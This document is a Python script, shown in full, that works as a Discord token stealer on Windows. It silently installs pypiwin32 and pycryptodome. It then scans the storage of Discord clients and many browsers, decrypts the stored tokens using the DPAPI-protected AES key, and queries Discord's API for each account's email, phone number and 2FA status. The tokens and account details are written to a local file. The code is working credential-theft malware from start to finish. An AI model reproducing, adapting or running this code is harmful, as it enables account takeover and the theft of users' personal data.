import os
import json
import base64
import datetime
import subprocess
import sys
import re

# Only run on Windows
if os.name != "nt":
    exit()

def install_required_modules():
    """Install required modules if missing"""
    modules = [
        ("win32crypt", "pypiwin32"), 
        ("Crypto.Cipher", "pycryptodome")
    ]
    
    for module, pip_name in modules:
        try:
            __import__(module)
        except ImportError:
            try:
                subprocess.check_call(
                    [sys.executable, "-m", "pip", "install", pip_name], 
                    stdout=subprocess.DEVNULL, 
                    stderr=subprocess.DEVNULL
                )
            except:
                pass

install_required_modules()

try:
    import win32crypt
    from Crypto.Cipher import AES
except ImportError:
    print("Required modules not available")
    exit()

# Browser paths
LOCAL = os.getenv("LOCALAPPDATA")
ROAMING = os.getenv("APPDATA")
PATHS = {
    'Discord': ROAMING + '\\discord',
    'Discord Canary': ROAMING + '\\discordcanary',
    'Lightcord': ROAMING + '\\Lightcord',
    'Discord PTB': ROAMING + '\\discordptb',
    'Opera': ROAMING + '\\Opera Software\\Opera Stable',
    'Opera GX': ROAMING + '\\Opera Software\\Opera GX Stable',
    'Amigo': LOCAL + '\\Amigo\\User Data',
    'Torch': LOCAL + '\\Torch\\User Data',
    'Kometa': LOCAL + '\\Kometa\\User Data',
    'Orbitum': LOCAL + '\\Orbitum\\User Data',
    'CentBrowser': LOCAL + '\\CentBrowser\\User Data',
    '7Star': LOCAL + '\\7Star\\7Star\\User Data',
    'Sputnik': LOCAL + '\\Sputnik\\Sputnik\\User Data',
    'Vivaldi': LOCAL + '\\Vivaldi\\User Data\\Default',
    'Chrome SxS': LOCAL + '\\Google\\Chrome SxS\\User Data',
    'Chrome': LOCAL + "\\Google\\Chrome\\User Data\\Default",
    'Epic Privacy Browser': LOCAL + '\\Epic Privacy Browser\\User Data',
    'Microsoft Edge': LOCAL + '\\Microsoft\\Edge\\User Data\\Default',
    'Uran': LOCAL + '\\uCozMedia\\Uran\\User Data\\Default',
    'Yandex': LOCAL + '\\Yandex\\YandexBrowser\\User Data\\Default',
    'Brave': LOCAL + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
    'Iridium': LOCAL + '\\Iridium\\User Data\\Default'
}

def get_headers(token=None):
    """Get request headers"""
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    }
    
    if token:
        headers["Authorization"] = token
        
    return headers

def get_tokens(path):
    """Extract tokens from browser storage"""
    path += "\\Local Storage\\leveldb\\"
    tokens = []
    
    if not os.path.exists(path):
        return tokens
        
    for file_name in os.listdir(path):
        if not file_name.endswith((".ldb", ".log")):
            continue
            
        try:
            with open(os.path.join(path, file_name), "r", errors="ignore") as file:
                for line in file:
                    line = line.strip()
                    for match in re.findall(r"dQw4w9WgXcQ:[^\"]*", line):
                        tokens.append(match)
        except (PermissionError, FileNotFoundError):
            continue
            
    return tokens

def get_encryption_key(path):
    """Get encryption key from Local State file"""
    try:
        with open(path + "\\Local State", "r") as file:
            local_state = json.load(file)
            encrypted_key = local_state['os_crypt']['encrypted_key']
            return base64.b64decode(encrypted_key)[5:]  # Remove DPAPI prefix
    except (FileNotFoundError, KeyError, json.JSONDecodeError):
        return None

def decrypt_token(encrypted_token, key):
    """Decrypt token using AES-GCM"""
    try:
        # Split the token parts
        parts = encrypted_token.split('dQw4w9WgXcQ:')
        if len(parts) < 2:
            return None
            
        encrypted_data = base64.b64decode(parts[1])
        nonce = encrypted_data[3:15]
        ciphertext = encrypted_data[15:-16]
        tag = encrypted_data[-16:]
        
        cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
        decrypted = cipher.decrypt_and_verify(ciphertext, tag)
        return decrypted.decode('utf-8')
    except Exception:
        return None

def get_user_info(token):
    """Get user information from Discord API"""
    try:
        import urllib.request
        import urllib.error
        
        # Get user profile
        req = urllib.request.Request(
            'https://discord.com/api/v10/users/@me',
            headers=get_headers(token)
        )
        
        with urllib.request.urlopen(req) as response:
            if response.getcode() != 200:
                return None
            user_data = json.loads(response.read().decode())
            
        return user_data
    except Exception:
        return None

def get_username():
    """Get Windows username"""
    try:
        return os.getenv("USERNAME") or os.getenv("USER") or "Unknown"
    except:
        return "Unknown"

def save_to_file(data, filename=None):
    """Save data to a text file in the same directory"""
    try:
        script_dir = os.path.dirname(os.path.abspath(__file__))
        
        # Use custom filename if provided, otherwise generate one with username
        if filename is None:
            username = get_username()
            filename = f"{username}_Discord.txt"
            
        file_path = os.path.join(script_dir, filename)
        
        with open(file_path, "a", encoding="utf-8") as file:
            file.write(data + "\n" + "="*50 + "\n")
            
        return True
    except Exception:
        return False

def format_user_data(user_data, token, platform):
    """Format user data for saving"""
    if not user_data:
        return None
        
    output = []
    output.append(f"Username: {user_data.get('username', 'N/A')}#{user_data.get('discriminator', 'N/A')}")
    output.append(f"User ID: {user_data.get('id', 'N/A')}")
    output.append(f"Email: {user_data.get('email', 'N/A')}")
    output.append(f"Phone: {user_data.get('phone', 'N/A')}")
    output.append(f"2FA Enabled: {user_data.get('mfa_enabled', 'N/A')}")
    output.append(f"Verified: {user_data.get('verified', 'N/A')}")
    output.append(f"Locale: {user_data.get('locale', 'N/A')}")
    output.append(f"Flags: {user_data.get('flags', 'N/A')}")
    output.append(f"Platform: {platform}")
    output.append(f"Token: {token}")
    output.append(f"Found at: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    
    return "\n".join(output)

def main():
    """Main function to extract and save tokens"""
    processed_tokens = set()
    
    for platform, path in PATHS.items():
        if not os.path.exists(path):
            continue
            
        print(f"Checking {platform}...")
        
        # Get encryption key
        key_data = get_encryption_key(path)
        if not key_data:
            continue
            
        try:
            key = win32crypt.CryptUnprotectData(key_data, None, None, None, 0)[1]
        except Exception:
            continue
            
        # Extract and decrypt tokens
        encrypted_tokens = get_tokens(path)
        for encrypted_token in encrypted_tokens:
            token = decrypt_token(encrypted_token, key)
            if not token or token in processed_tokens:
                continue
                
            processed_tokens.add(token)
            
            # Get user info
            user_data = get_user_info(token)
            if user_data:
                formatted_data = format_user_data(user_data, token, platform)
                if formatted_data and save_to_file(formatted_data):
                    print(f"Saved data for {user_data.get('username', 'Unknown')}")
            else:
                # Save token even if we can't get user info
                basic_data = f"Token: {token}\nPlatform: {platform}\nValid: Unknown\nFound at: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
                save_to_file(basic_data)

if __name__ == "__main__":
    main()
